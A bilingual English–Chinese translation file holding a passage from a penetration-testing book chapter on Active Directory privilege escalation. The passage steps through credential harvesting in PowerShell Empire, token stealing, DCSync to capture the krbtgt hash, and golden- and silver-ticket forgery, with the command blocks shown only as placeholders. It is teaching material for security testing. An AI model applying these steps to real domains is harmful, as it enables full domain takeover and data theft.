- en: List all the credentials harvested in the Empire tool by running the `credentials`
    command; If we do not see `krbtgt`, then we will utilize the agent that is running
    on the domain controller to get the hash value. In this case, we will run CrackMapExec
    on the domain controller using `exchangeadmin` as the value and interact with
    the agent.
  id: totrans-211
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过运行`credentials`命令列出在Empire工具中收集的所有凭据；如果我们没有看到`krbtgt`，那么我们将利用在域控制器上运行的代理来获取哈希值。在这种情况下，我们将在域控制器上使用`exchangeadmin`作为值运行CrackMapExec并与代理进行交互。
- en: The next step is to identify a process that is running as privilege-level, steal
    the token, and run a further command with the use of the `steal_token PID` command
    in the Empire tool, as shown in *Figure 12.40*:![](../Images/B17765_12_40.png)
  id: totrans-212
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是识别一个以特权级别运行的进程，窃取令牌，并使用Empire工具中的`steal_token PID`命令执行进一步的命令，如*图12.40*所示：![](../Images/B17765_12_40.png)
- en: 'Figure 12.40: Stealing a session token of a high-privilege user'
  id: totrans-213
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图12.40：窃取高权限用户的会话令牌
- en: 'Now we are set to run as Administrator from the domain controller that is running
    the `mastering.kali.fourthedition` domain. The output should include the domain
    SID and the necessary password hash:'
  id: totrans-214
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们可以从运行`mastering.kali.fourthedition`域的域控制器上以管理员身份运行。输出应包括域SID和必要的密码哈希值：
- en: '[PRE13]'
  id: totrans-215
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE13]'
- en: '![](../Images/B17765_12_41.png)'
  id: totrans-216
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_41.png)'
- en: 'Figure 12.41: Output of DCSync and successfully capturing the password hash
    of krbtgt'
  id: totrans-217
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图12.41：DCSync输出并成功捕获krbtgt的密码哈希
- en: By now, we should have stolen the `krbtgt` user account password hash, if the
    domain controller is vulnerable. Attackers should do the same across all the domain
    controllers if DCSync failed, and they should be able to see the new credential
    added to the existing list with the username `krbtgt`:![](../Images/B17765_12_42.png)
  id: totrans-218
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 到目前为止，如果域控制器存在漏洞，我们应该已经窃取了`krbtgt`用户账户的密码哈希。攻击者应该在所有域控制器上执行相同的操作，如果DCSync失败，他们应该能够看到新凭证被添加到现有列表中，用户名为`krbtgt`：![](../Images/B17765_12_42.png)
- en: 'Figure 12.42: Validating the hash value of krbtgt in PowerShell Empire'
  id: totrans-219
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图12.42：在PowerShell Empire中验证krbtgt的哈希值
- en: 'Finally, when we get the Kerberos hash, this hash can be passed to the domain
    controller to issue a golden ticket. Now we can utilize the low-privileged user,
    `normaluser`, and run the `golden_ticket` module with the right credential ID
    and any username for the module. When the module is successfully executed, you
    should be able to see a message as shown in the following screenshot and run the
    golden ticket module with any user you like:'
  id: totrans-220
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后，当我们获取Kerberos哈希时，可以将该哈希传递给域控制器，以颁发金票。现在，我们可以利用低权限用户`normaluser`，并使用正确的凭证ID和任何用户名运行`golden_ticket`模块。当模块成功执行时，您应该能够看到如下截图中的消息，并可以使用任何用户运行金票模块：
- en: '[PRE14]'
  id: totrans-221
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE14]'
- en: Successful execution of the module should provide us with the details shown
    in *Figure 12.43*:![](../Images/B17765_12_43.png)
  id: totrans-222
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 成功执行模块后，我们应该能看到*图12.43*中显示的详细信息：![](../Images/B17765_12_43.png)
- en: 'Figure 12.43: Creating the golden ticket using krbtgt and an invalid user'
  id: totrans-223
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图12.43：使用krbtgt和无效用户创建金票
- en: And attackers can validate the generated Kerberos ticket using `klist` whether
    the ticket generated is in the session or not, as seen in *Figure 12.44*:![](../Images/B17765_12_44.png)
  id: totrans-224
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 攻击者可以使用`klist`验证生成的Kerberos票证是否在会话中，如*图12.44*所示：![](../Images/B17765_12_44.png)
- en: 'Figure 12.44: Validating the cached tickets on the target machine'
  id: totrans-225
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图12.44：在目标机器上验证缓存的票证
- en: With the golden ticket, the attacker should be able to view any files on the
    domain controller as follows, or any system on the domain with this golden ticket,
    and exfiltrate data:![](../Images/B17765_12_45.png)
  id: totrans-226
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过金票攻击，攻击者应该能够访问域控制器上的任何文件，或使用此金票访问域内任何系统，并提取数据：![](../Images/B17765_12_45.png)
- en: 'Figure 12.45: Successful exploitation of the golden ticket attack'
  id: totrans-227
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图12.45：金票攻击成功利用
- en: 'This can also be achieved by running the following from `mimikatz` on the compromised
    system, if the attacker has a remote desktop session on the target domain controller,
    with the following command:'
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: 如果攻击者在目标域控制器上有远程桌面会话，也可以通过在受感染的系统上运行以下命令来实现这一点，命令如下：
- en: '[PRE15]'
  id: totrans-229
  prefs: []
  type: TYPE_PRE
  zh: '[PRE15]'
- en: 'By running this, attackers get authenticated as any user, even a non-existing
    user, including the enterprise-administrator and schema-administrator levels.
    Within the same ticket, attackers can also perform DCSync using Mimikatz, as seen
    in *Figure 12.46*:'
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: 通过运行此操作，攻击者可以以任何用户身份进行身份验证，甚至是不存在的用户，包括企业管理员和架构管理员级别。在同一张票证内，攻击者还可以使用Mimikatz执行DCSync，如*图12.46*所示：
- en: '[PRE16]'
  id: totrans-231
  prefs: []
  type: TYPE_PRE
  zh: '[PRE16]'
- en: '![](../Images/B17765_12_46.png)'
  id: totrans-232
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_46.png)'
- en: 'Figure 12.46: Performing DCSync using Mimikatz on a low-privilege user using
    the golden ticket'
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: 图12.46：使用Mimikatz对低权限用户执行DCSync操作，利用金票
- en: One more similar attack is the Kerberos silver-ticket attack, which is not talked
    about much. This attack again forges the TGS, but it is signed by a service account;
    this means the silver-ticket attack is limited to whatever service is directed
    on the server. The PowerShell Empire tool can be utilized to exploit the same
    vulnerability using the `credentials/mimikatz/silver_ticket` module by providing
    the `rc4/NTLM` hash to the parameters.
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个类似的攻击是Kerberos银票攻击，这个攻击并不常被讨论。此攻击再次伪造TGS，但它是由服务帐户签名的；这意味着银票攻击仅限于指向服务器上的某个服务。可以利用PowerShell
    Empire工具，使用`credentials/mimikatz/silver_ticket`模块，并提供`rc4/NTLM`哈希值来利用相同的漏洞。
- en: Summary
  id: totrans-235
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we looked at the methodology of escalating privileges and explored
    different methods and tools that can be utilized to achieve our penetration test
    goal.
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 本章中，我们研究了提升权限的方法，并探讨了可用来实现渗透测试目标的不同方法和工具。
- en: We first started with common system-level privilege escalation by exploiting
    `ms18_8120_win32k_privesc` on Windows Server 2008 and using `bypassuac_fodhelper`
    on Windows 10 machines. We focused on utilizing Meterpreter to gain system-level
    control and later we took a detailed look at utilizing the Empire tool; then we
    harvested credentials by using password sniffers on the network. We also utilized
    Responder and performed NTLM relay attacks to gain remote system access, and we
    used Responder to capture the passwords of different systems on a network that
    utilizes SMB.
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先通过利用Windows Server 2008上的`ms18_8120_win32k_privesc`进行常见的系统级特权提升，并在Windows
    10机器上使用`bypassuac_fodhelper`。我们专注于利用Meterpreter获取系统级控制，之后详细研究了如何使用Empire工具；然后，我们通过在网络上使用密码嗅探器来获取凭证。我们还利用Responder执行了NTLM中继攻击以获得远程系统访问权限，并使用Responder捕获了网络中不同系统的密码，这些系统使用了SMB协议。
- en: We completely compromised an Active Directory using a structured approach. Finally,
    we exploited access rights in Active Directory by using PowerShell Empire and
    a compromised Kerberos account and performed a golden-ticket attack utilizing
    the Empire tool.
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: 我们通过一种结构化的方法完全攻破了一个Active Directory。最后，我们通过使用PowerShell Empire和一个被攻破的Kerberos账户，利用Empire工具执行了黄金票证攻击，进一步利用了Active
    Directory中的访问权限。
- en: In the next chapter (*Chapter 13*, *Command and Control*), we will learn how
    attackers use different techniques to maintain access to a compromised system
    in line with the cyber kill chain methodology. We will also delve into how to
    exfiltrate data from internal systems to external systems.
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章（*第13章*，*命令与控制*）中，我们将学习攻击者如何使用不同的技术根据网络杀伤链方法论来保持对被攻破系统的访问。我们还将深入探讨如何从内部系统向外部系统窃取数据。
